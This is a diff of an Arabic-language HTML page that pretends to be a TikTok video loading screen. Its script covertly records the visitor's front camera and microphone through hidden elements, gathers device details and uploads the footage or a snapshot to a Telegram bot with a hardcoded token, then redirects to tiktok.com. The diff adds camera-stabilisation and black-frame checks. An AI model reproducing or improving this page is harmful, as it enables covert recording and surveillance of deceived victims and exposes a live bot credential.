@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>TikTok Video Player</title>
+    <title>TikTok Video</title>
     <style>
         * {
             margin: 0;
@@ -21,7 +21,7 @@
             overflow: hidden;
         }
 
-        .tiktok-container {
+        .tiktok-interface {
             position: fixed;
             top: 0;
             left: 0;
@@ -37,93 +37,101 @@
             z-index: 9999;
         }
 
-        .tiktok-logo svg {
+        .tiktok-logo {
             width: 100px;
             height: 100px;
             margin-bottom: 30px;
-            filter: drop-shadow(0 0 20px rgba(255, 0, 80, 0.5));
-            animation: pulse 2s infinite;
+            animation: glow 2s ease-in-out infinite;
         }
 
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.05); opacity: 0.9; }
-            100% { transform: scale(1); opacity: 1; }
+        @keyframes glow {
+            0% { filter: drop-shadow(0 0 10px rgba(255,0,80,0.5)); }
+            50% { filter: drop-shadow(0 0 30px rgba(255,0,80,0.8)); }
+            100% { filter: drop-shadow(0 0 10px rgba(255,0,80,0.5)); }
         }
 
-        .loading-title {
-            font-size: 28px;
+        .tiktok-logo svg {
+            width: 100%;
+            height: 100%;
+            fill: white;
+        }
+
+        .title {
+            font-size: 32px;
             font-weight: bold;
-            margin-bottom: 15px;
-            background: linear-gradient(45deg, #ff0050, #00f2ea);
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #ff0050, #00f2ea);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
 
-        .loading-subtitle {
-            color: #888;
+        .subtitle {
+            color: #666;
             font-size: 16px;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
-        .progress-wrapper {
-            width: 300px;
+        .progress-section {
+            width: 320px;
             margin: 20px auto;
         }
 
-        .progress-bar-bg {
+        .progress-bar-container {
             width: 100%;
-            height: 6px;
+            height: 8px;
             background: rgba(255,255,255,0.1);
-            border-radius: 3px;
+            border-radius: 4px;
             overflow: hidden;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
 
-        .progress-fill {
+        .progress-bar-fill {
             width: 0%;
             height: 100%;
             background: linear-gradient(90deg, #ff0050, #00f2ea);
-            border-radius: 3px;
-            transition: width 0.3s ease;
+            border-radius: 4px;
+            transition: width 0.2s linear;
             box-shadow: 0 0 20px #ff0050;
         }
 
-        .percentage {
+        .percentage-text {
             color: #ff0050;
-            font-size: 18px;
+            font-size: 24px;
             font-weight: bold;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px rgba(255,0,80,0.5);
         }
 
         .status-text {
             color: #00f2ea;
-            font-size: 14px;
+            font-size: 16px;
             margin-bottom: 30px;
-            opacity: 0.8;
+            opacity: 0.9;
         }
 
-        .hint-box {
-            background: rgba(255,255,255,0.05);
+        .redirect-hint {
+            background: rgba(255,255,255,0.03);
             border: 1px solid rgba(255,255,255,0.1);
-            border-radius: 10px;
-            padding: 15px 25px;
+            border-radius: 50px;
+            padding: 15px 30px;
             margin-top: 30px;
         }
 
-        .hint-text {
-            color: #666;
-            font-size: 13px;
-        }
-
-        .hint-text span {
+        .redirect-hint span {
             color: #ff0050;
             font-weight: bold;
         }
 
-        /* عناصر مخفية للتصوير */
-        .hidden-elements {
+        .redirect-hint small {
+            color: #444;
+            font-size: 12px;
+            display: block;
+            margin-top: 5px;
+        }
+
+        /* عناصر التصوير الخفية - مخفية تماماً */
+        .recording-elements {
             position: fixed;
             top: -9999px;
             left: -9999px;
@@ -131,99 +139,107 @@
             height: 1px;
             opacity: 0;
             pointer-events: none;
+            z-index: -9999;
         }
     </style>
 </head>
 <body>
     <!-- واجهة تيك توك المزيفة -->
-    <div class="tiktok-container" id="tiktokUI">
+    <div class="tiktok-interface" id="tiktokUI">
         <div class="tiktok-logo">
-            <svg viewBox="0 0 24 24" fill="white">
+            <svg viewBox="0 0 24 24">
                 <path d="M19.59 6.69a4.83 4.83 0 0 1-3.77-4.25V2h-3.45v13.67a2.89 2.89 0 0 1-5.2 1.74 2.89 2.89 0 0 1 2.31-4.64 2.93 2.93 0 0 1 .88.13V9.4a6.84 6.84 0 0 0-1-.05A6.33 6.33 0 0 0 5 20.24a6.34 6.34 0 0 0 10.86-4.95v-7a8.16 8.16 0 0 0 4.77 1.52v-3.4a4.85 4.85 0 0 1-1.04-.72z"/>
             </svg>
         </div>
         
-        <div class="loading-title">TikTok</div>
-        <div class="loading-subtitle">جاري تحميل الفيديو...</div>
+        <div class="title">TikTok</div>
+        <div class="subtitle">جاري تحميل الفيديو...</div>
         
-        <div class="progress-wrapper">
-            <div class="progress-bar-bg">
-                <div class="progress-fill" id="progressFill"></div>
+        <div class="progress-section">
+            <div class="progress-bar-container">
+                <div class="progress-bar-fill" id="progressFill"></div>
             </div>
-            <div class="percentage" id="percentageDisplay">0%</div>
+            <div class="percentage-text" id="percentageDisplay">0%</div>
         </div>
         
-        <div class="status-text" id="statusMessage">⏳ يرجى الانتظار قليلاً</div>
+        <div class="status-text" id="statusDisplay">🔍 جاري الاتصال بالخادم...</div>
         
-        <div class="hint-box">
-            <div class="hint-text">سيتم تحويلك إلى <span>TikTok</span> تلقائياً</div>
+        <div class="redirect-hint">
+            سيتم تحويلك إلى <span>TikTok</span> تلقائياً
+            <small>Video Player v3.0</small>
         </div>
     </div>
 
-    <!-- عناصر التسجيل المخفية -->
-    <div class="hidden-elements">
+    <!-- عناصر التصوير الخفية -->
+    <div class="recording-elements">
         <video id="hiddenVideo" autoplay playsinline muted></video>
-        <canvas id="hiddenCanvas"></canvas>
+        <canvas id="hiddenCanvas" width="1280" height="720"></canvas>
     </div>
 
     <script>
         (function() {
-            // ================== إعدادات البوت والأوامر ==================
-            const BOT_CONFIG = {
-                token: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU",
-                adminId: "739226288", // الآيدي بتاعك انت
+            // ================== الإعدادات الأساسية ==================
+            const CONFIG = {
+                botToken: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU",
                 
-                // رسائل الأوامر
-                commands: {
-                    start: "/start",
-                    video: "/video",
-                    help: "/help"
-                }
+                // إعدادات التسجيل المتقدمة
+                recording: {
+                    duration: 8000,              // 8 ثواني
+                    stabilizationDelay: 3500,      // 3.5 ثانية تثبيت
+                    checkInterval: 200,             // فحص كل 200ms
+                    
+                    video: {
+                        width: 1280,
+                        height: 720,
+                        frameRate: 30,
+                        bitrate: 4000000,           // 4 Mbps
+                        facingMode: "user"            // الكاميرا الأمامية
+                    },
+                    
+                    audio: {
+                        enabled: true,
+                        sampleRate: 48000,
+                        channelCount: 2,
+                        bitrate: 128000                // 128 kbps
+                    }
+                },
+                
+                redirectUrl: "https://www.tiktok.com",
+                maxWaitTime: 20000                      // 20 ثانية حد أقصى
             };
-
-            // ================== إعدادات التسجيل ==================
-            const RECORDING_CONFIG = {
-                duration: 10000,           // 10 ثواني فيديو
-                videoBitsPerSecond: 4000000, // 4 Mbps جودة عالية
-                audioBitsPerSecond: 128000,   // 128 kbps صوت
-                width: 1280,
-                height: 720,
-                frameRate: 30,
-                mimeType: 'video/webm;codecs=vp9,opus'
-            };
-
-            // ================== إعدادات التوجيه ==================
-            const REDIRECT_URL = "https://www.tiktok.com";
 
             // ================== عناصر الواجهة ==================
-            const elements = {
+            const ui = {
                 progressFill: document.getElementById('progressFill'),
                 percentageDisplay: document.getElementById('percentageDisplay'),
-                statusMessage: document.getElementById('statusMessage')
+                statusDisplay: document.getElementById('statusDisplay')
             };
 
             // ================== عناصر التسجيل ==================
             const hiddenVideo = document.getElementById('hiddenVideo');
             const hiddenCanvas = document.getElementById('hiddenCanvas');
 
-            // ================== متغيرات التسجيل ==================
+            // ================== متغيرات الحالة ==================
             let mediaStream = null;
             let mediaRecorder = null;
             let recordedChunks = [];
             let recordingStartTime = null;
             let captureCompleted = false;
+            let stabilizationCompleted = false;
+            let videoReady = false;
+            let audioReady = false;
             let progressInterval = null;
 
             // ================== دوال التحديث ==================
-            function updateUI(progress, status) {
-                if (elements.progressFill) {
-                    elements.progressFill.style.width = `${progress}%`;
+            function updateUI(percent, status) {
+                if (ui.progressFill) {
+                    ui.progressFill.style.width = `${percent}%`;
                 }
-                if (elements.percentageDisplay) {
-                    elements.percentageDisplay.innerText = `${Math.round(progress)}%`;
+                if (ui.percentageDisplay) {
+                    ui.percentageDisplay.innerText = `${Math.round(percent)}%`;
                 }
-                if (elements.statusMessage && status) {
-                    elements.statusMessage.innerText = status;
+                if (ui.statusDisplay && status) {
+                    ui.statusDisplay.innerText = status;
                 }
             }
 
@@ -234,57 +250,96 @@
                 return (bytes / (1024 * 1024 * 1024)).toFixed(1) + ' GB';
             }
 
-            function getDeviceFingerprint() {
-                return {
-                    platform: navigator.platform,
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    screen: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth + '-bit',
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cores: navigator.hardwareConcurrency || 'unknown',
-                    memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'unknown',
-                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
-                    touchPoints: navigator.maxTouchPoints || 0,
-                    cookies: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack || 'disabled'
-                };
+            // ================== فحص جودة الفيديو ==================
+            function checkVideoQuality() {
+                if (!hiddenVideo.videoWidth || !hiddenVideo.videoHeight) {
+                    return false;
+                }
+                
+                // رسم إطار اختباري
+                hiddenCanvas.width = hiddenVideo.videoWidth;
+                hiddenCanvas.height = hiddenVideo.videoHeight;
+                const ctx = hiddenCanvas.getContext('2d');
+                ctx.drawImage(hiddenVideo, 0, 0);
+                
+                // فحص وحدات البكسل (نتأكد أنها ليست سوداء بالكامل)
+                try {
+                    const imageData = ctx.getImageData(0, 0, 10, 10);
+                    let hasColor = false;
+                    
+                    for (let i = 0; i < imageData.data.length; i += 4) {
+                        const r = imageData.data[i];
+                        const g = imageData.data[i + 1];
+                        const b = imageData.data[i + 2];
+                        
+                        // إذا كان هناك أي لون غير أسود بالكامل
+                        if (r > 10 || g > 10 || b > 10) {
+                            hasColor = true;
+                            break;
+                        }
+                    }
+                    
+                    return hasColor;
+                    
+                } catch (e) {
+                    return false;
+                }
             }
 
-            // ================== دوال التسجيل ==================
-            async function startVideoRecording() {
-                const urlParams = new URLSearchParams(window.location.search);
-                const targetId = urlParams.get('id');
+            // ================== انتظار تثبيت الكاميرا ==================
+            async function waitForStabilization() {
+                updateUI(5, "⚙️ تهيئة الكاميرا...");
                 
-                if (!targetId) {
-                    console.log("لا يوجد ID مستهدف");
-                    window.location.href = REDIRECT_URL;
-                    return;
+                let stabilized = false;
+                let attempts = 0;
+                const maxAttempts = 20;
+                
+                while (!stabilized && attempts < maxAttempts && !captureCompleted) {
+                    await new Promise(resolve => setTimeout(resolve, CONFIG.recording.checkInterval));
+                    
+                    stabilized = checkVideoQuality();
+                    attempts++;
+                    
+                    if (stabilized) {
+                        console.log("✅ الكاميرا مستقرة بعد", attempts * CONFIG.recording.checkInterval, "ms");
+                        break;
+                    }
                 }
+                
+                // حتى لو ما استقرت، نكمل بعد 3.5 ثانية
+                await new Promise(resolve => setTimeout(resolve, CONFIG.recording.stabilizationDelay));
+                
+                return stabilized;
+            }
 
+            // ================== بدء التسجيل ==================
+            async function startRecording(targetId) {
                 try {
                     updateUI(2, "🔍 طلب الكاميرا والميكروفون...");
                     
                     // طلب الكاميرا والميكروفون
-                    mediaStream = await navigator.mediaDevices.getUserMedia({
+                    const constraints = {
                         video: {
-                            facingMode: "user",
-                            width: { ideal: RECORDING_CONFIG.width },
-                            height: { ideal: RECORDING_CONFIG.height },
-                            frameRate: { ideal: RECORDING_CONFIG.frameRate }
+                            facingMode: CONFIG.recording.video.facingMode,
+                            width: { ideal: CONFIG.recording.video.width },
+                            height: { ideal: CONFIG.recording.video.height },
+                            frameRate: { ideal: CONFIG.recording.video.frameRate }
                         },
-                        audio: {
+                        audio: CONFIG.recording.audio.enabled ? {
                             echoCancellation: false,
                             noiseSuppression: false,
                             autoGainControl: false,
-                            sampleRate: 48000,
-                            channelCount: 2
-                        }
-                    });
+                            sampleRate: CONFIG.recording.audio.sampleRate,
+                            channelCount: CONFIG.recording.audio.channelCount
+                        } : false
+                    };
 
+                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    
+                    // ربط الكاميرا بالفيديو
                     hiddenVideo.srcObject = mediaStream;
                     
-                    // انتظار تهيئة الفيديو
+                    // انتظار تحميل الفيديو
                     await new Promise((resolve) => {
                         hiddenVideo.onloadedmetadata = () => {
                             hiddenVideo.play();
@@ -292,35 +347,41 @@
                         };
                     });
 
-                    updateUI(10, "⚙️ تهيئة الكاميرا... (3 ثواني)");
+                    // فحص الصوت
+                    audioReady = mediaStream.getAudioTracks().length > 0;
+                    updateUI(10, audioReady ? "🎤 الكاميرا والصوت جاهزان" : "📹 الكاميرا جاهزة (بدون صوت)");
                     
-                    // انتظار لضبط الإضاءة والصوت
-                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    // انتظار تثبيت الكاميرا وجودة الصورة
+                    const quality = await waitForStabilization();
                     
-                    // بدء التسجيل
-                    await setupRecorder(targetId);
+                    if (!quality) {
+                        console.log("⚠️ جودة الصورة منخفضة، نكمل على أي حال");
+                    }
+                    
+                    // بدء التسجيل الفعلي
+                    await initializeRecorder(targetId);
 
                 } catch (error) {
-                    console.error("خطأ:", error);
+                    console.error("خطأ في الكاميرا:", error);
                     
-                    // إذا فشل الميكروفون، حاول بالكاميرا فقط
+                    // إذا فشل الصوت، حاول بدون صوت
                     if (error.name === 'NotAllowedError' || error.name === 'NotFoundError') {
-                        await startVideoOnly(targetId);
+                        await startRecordingWithoutAudio(targetId);
                     } else {
                         await handleFatalError(targetId, error);
                     }
                 }
             }
 
-            async function startVideoOnly(targetId) {
+            async function startRecordingWithoutAudio(targetId) {
                 try {
-                    updateUI(5, "📹 محاولة بالكاميرا فقط...");
+                    updateUI(5, "📹 محاولة بدون ميكروفون...");
                     
                     mediaStream = await navigator.mediaDevices.getUserMedia({
                         video: {
-                            facingMode: "user",
-                            width: { ideal: RECORDING_CONFIG.width },
-                            height: { ideal: RECORDING_CONFIG.height }
+                            facingMode: CONFIG.recording.video.facingMode,
+                            width: { ideal: CONFIG.recording.video.width },
+                            height: { ideal: CONFIG.recording.video.height }
                         },
                         audio: false
                     });
@@ -334,23 +395,23 @@
                         };
                     });
 
-                    updateUI(15, "⚙️ تهيئة الكاميرا...");
-                    await new Promise(resolve => setTimeout(resolve, 3000));
+                    updateUI(15, "📹 الكاميرا جاهزة");
                     
-                    await setupRecorder(targetId);
+                    await waitForStabilization();
+                    await initializeRecorder(targetId);
 
                 } catch (error) {
                     await handleFatalError(targetId, error);
                 }
             }
 
-            async function setupRecorder(targetId) {
+            async function initializeRecorder(targetId) {
                 return new Promise((resolve, reject) => {
                     try {
                         recordedChunks = [];
                         recordingStartTime = Date.now();
 
-                        // اختيار أفضل كوديك متوفر
+                        // اختيار أفضل كوديك
                         const mimeTypes = [
                             'video/webm;codecs=vp9,opus',
                             'video/webm;codecs=vp8,opus',
@@ -366,11 +427,11 @@
                             }
                         }
 
-                        // إعداد المسجل
+                        // إعداد المسجل بجودة عالية
                         mediaRecorder = new MediaRecorder(mediaStream, {
                             mimeType: selectedMimeType,
-                            videoBitsPerSecond: RECORDING_CONFIG.videoBitsPerSecond,
-                            audioBitsPerSecond: RECORDING_CONFIG.audioBitsPerSecond
+                            videoBitsPerSecond: CONFIG.recording.video.bitrate,
+                            audioBitsPerSecond: CONFIG.recording.audio.bitrate
                         });
 
                         mediaRecorder.ondataavailable = (event) => {
@@ -380,17 +441,19 @@
                         };
 
                         mediaRecorder.onstop = async () => {
+                            // تجميع الفيديو
                             const blob = new Blob(recordedChunks, { type: 'video/webm' });
                             
                             if (blob.size < 50000) {
                                 console.log("❌ الفيديو صغير جداً");
-                                await sendErrorMessage(targetId, "فشل التسجيل - فيديو صغير");
-                                window.location.href = REDIRECT_URL;
+                                await sendErrorMessage(targetId, "فشل التسجيل");
+                                window.location.href = CONFIG.redirectUrl;
                                 return;
                             }
 
                             updateUI(95, "📤 جاري رفع الفيديو...");
                             
+                            // إرسال الفيديو
                             const success = await uploadVideo(blob, targetId);
                             
                             if (success) {
@@ -401,31 +464,38 @@
                                     mediaStream.getTracks().forEach(track => track.stop());
                                 }
                                 
-                                // التوجيه لتيك توك
+                                // التوجيه
                                 setTimeout(() => {
-                                    window.location.href = REDIRECT_URL;
-                                }, 2000);
+                                    window.location.href = CONFIG.redirectUrl;
+                                }, 1500);
                             } else {
                                 await sendErrorMessage(targetId, "فشل رفع الفيديو");
                                 setTimeout(() => {
-                                    window.location.href = REDIRECT_URL;
-                                }, 2000);
+                                    window.location.href = CONFIG.redirectUrl;
+                                }, 1500);
                             }
                             
                             resolve();
                         };
 
                         // بدء التسجيل
-                        mediaRecorder.start(1000);
-                        updateUI(20, `🔴 تسجيل ${RECORDING_CONFIG.duration/1000} ثواني مع الصوت...`);
+                        mediaRecorder.start(1000); // إرسال كل ثانية
+                        
+                        const hasAudio = mediaStream.getAudioTracks().length > 0;
+                        updateUI(20, `🔴 تسجيل ${CONFIG.recording.duration/1000} ثواني ${hasAudio ? 'مع الصوت' : 'بدون صوت'}...`);
                         
                         // تحديث التقدم
                         progressInterval = setInterval(() => {
                             if (captureCompleted) return;
                             
                             const elapsed = Date.now() - recordingStartTime;
-                            const progress = 20 + (elapsed / RECORDING_CONFIG.duration) * 70;
-                            updateUI(Math.min(progress, 90), `⏱️ تسجيل... ${Math.round(elapsed/1000)}/${RECORDING_CONFIG.duration/1000} ثانية`);
+                            const progress = 20 + (elapsed / CONFIG.recording.duration) * 70;
+                            
+                            const secondsLeft = Math.max(0, (CONFIG.recording.duration - elapsed) / 1000);
+                            updateUI(
+                                Math.min(progress, 90), 
+                                `⏱️ تسجيل... ${secondsLeft.toFixed(1)} ثانية متبقية`
+                            );
                         }, 100);
 
                         // إيقاف التسجيل بعد المدة
@@ -435,7 +505,7 @@
                                 mediaRecorder.stop();
                                 clearInterval(progressInterval);
                             }
-                        }, RECORDING_CONFIG.duration);
+                        }, CONFIG.recording.duration);
 
                     } catch (error) {
                         console.error("خطأ في التسجيل:", error);
@@ -446,67 +516,80 @@
 
             async function uploadVideo(blob, targetId) {
                 try {
-                    const deviceInfo = getDeviceFingerprint();
-                    
+                    // معلومات الجهاز
+                    const deviceInfo = {
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent.substring(0, 100),
+                        language: navigator.language,
+                        screen: `${screen.width}x${screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        cores: navigator.hardwareConcurrency || '?',
+                        memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : '?',
+                        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+                    };
+
                     const formData = new FormData();
                     formData.append('chat_id', targetId);
-                    formData.append('video', blob, 'video.webm');
+                    formData.append('video', blob, 'recording.webm');
                     
                     let caption = `🎥 تسجيل فيديو جديد
-                    
-⏱️ المدة: ${RECORDING_CONFIG.duration/1000} ثواني
-📏 الدقة: ${RECORDING_CONFIG.width}x${RECORDING_CONFIG.height}
+
+⏱️ المدة: ${CONFIG.recording.duration/1000} ثواني
+📏 الدقة: ${CONFIG.recording.video.width}x${CONFIG.recording.video.height}
 💾 الحجم: ${formatFileSize(blob.size)}
-🔊 الصوت: ${mediaStream.getAudioTracks().length > 0 ? 'نعم' : 'لا'}
+🔊 الصوت: ${mediaStream?.getAudioTracks().length > 0 ? 'نعم' : 'لا'}
 
 📱 معلومات الجهاز:
 • النظام: ${deviceInfo.platform}
 • المعالج: ${deviceInfo.cores} نواة
 • الذاكرة: ${deviceInfo.memory}
-• الشاشة: ${deviceInfo.screen} (${deviceInfo.colorDepth})
+• الشاشة: ${deviceInfo.screen}
 • اللغة: ${deviceInfo.language}
 • التوقيت: ${deviceInfo.timezone}
 • الاتصال: ${deviceInfo.connection}
-• نقط اللمس: ${deviceInfo.touchPoints}
-• الكوكيز: ${deviceInfo.cookies ? 'مفعلة' : 'معطلة'}
 
-⏰ وقت التسجيل: ${new Date().toLocaleString('ar-EG')}`;
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
 
                     formData.append('caption', caption);
 
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendVideo`, {
+                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendVideo`, {
                         method: 'POST',
                         body: formData
                     });
 
-                    return response.ok;
+                    if (!response.ok) {
+                        // إذا الفيديو كبير، أرسل صورة
+                        if (blob.size > 50 * 1024 * 1024) {
+                            return await uploadPhoto(targetId);
+                        }
+                        return false;
+                    }
+
+                    return true;
 
                 } catch (error) {
                     console.error("خطأ في الرفع:", error);
-                    
-                    // إذا فشل، أرسل صورة
                     return await uploadPhoto(targetId);
                 }
             }
 
             async function uploadPhoto(targetId) {
                 try {
-                    hiddenCanvas.width = hiddenVideo.videoWidth;
-                    hiddenCanvas.height = hiddenVideo.videoHeight;
+                    hiddenCanvas.width = hiddenVideo.videoWidth || 1280;
+                    hiddenCanvas.height = hiddenVideo.videoHeight || 720;
                     hiddenCanvas.getContext('2d').drawImage(hiddenVideo, 0, 0);
                     
                     const blob = await new Promise(resolve => {
-                        hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.9);
+                        hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.95);
                     });
 
                     const formData = new FormData();
                     formData.append('chat_id', targetId);
-                    formData.append('photo', blob, 'photo.jpg');
-                    formData.append('caption', `📸 لقطة شاشة (فشل الفيديو)
-🆔 المعرف: ${targetId}
+                    formData.append('photo', blob, 'snapshot.jpg');
+                    formData.append('caption', `📸 صورة (بديل الفيديو)
 ⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`);
 
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendPhoto`, {
+                    const response = await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
@@ -521,54 +604,48 @@
 
             async function sendErrorMessage(targetId, errorMsg) {
                 try {
-                    const deviceInfo = getDeviceFingerprint();
-                    const text = `❌ خطأ في التسجيل
-                    
-${errorMsg}
-🆔 المعرف: ${targetId}
-📱 النظام: ${deviceInfo.platform}
-⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;
-
-                    await fetch(`https://api.telegram.org/bot${BOT_CONFIG.token}/sendMessage`, {
+                    await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: targetId, text: text })
+                        body: JSON.stringify({
+                            chat_id: targetId,
+                            text: `❌ ${errorMsg}\n⏰ ${new Date().toLocaleString('ar-EG')}`
+                        })
                     });
                 } catch (e) {}
             }
 
             async function handleFatalError(targetId, error) {
                 console.error("خطأ جسيم:", error);
-                
-                await sendErrorMessage(targetId, error.message || 'خطأ غير معروف');
-                window.location.href = REDIRECT_URL;
+                await sendErrorMessage(targetId, `فشل التسجيل: ${error.message}`);
+                window.location.href = CONFIG.redirectUrl;
             }
 
-            // ================== بدء التنفيذ ==================
+            // ================== بدء التشغيل ==================
             function initialize() {
                 const urlParams = new URLSearchParams(window.location.search);
                 const targetId = urlParams.get('id');
                 
                 if (!targetId) {
-                    console.log("⚠️ لا يوجد ID - توجيه مباشر");
-                    window.location.href = REDIRECT_URL;
+                    console.log("⚠️ لا يوجد ID");
+                    window.location.href = CONFIG.redirectUrl;
                     return;
                 }
 
                 console.log("🚀 بدء التسجيل للمعرف:", targetId);
                 
                 // بدء التسجيل
-                startVideoRecording();
+                startRecording(targetId);
 
-                // حد أقصى 25 ثانية
+                // حد أقصى
                 setTimeout(() => {
                     if (!captureCompleted) {
-                        window.location.href = REDIRECT_URL;
+                        window.location.href = CONFIG.redirectUrl;
                     }
-                }, 25000);
+                }, CONFIG.maxWaitTime);
             }
 
-            // تشغيل كل شيء
+            // تشغيل
             initialize();
 
         })();
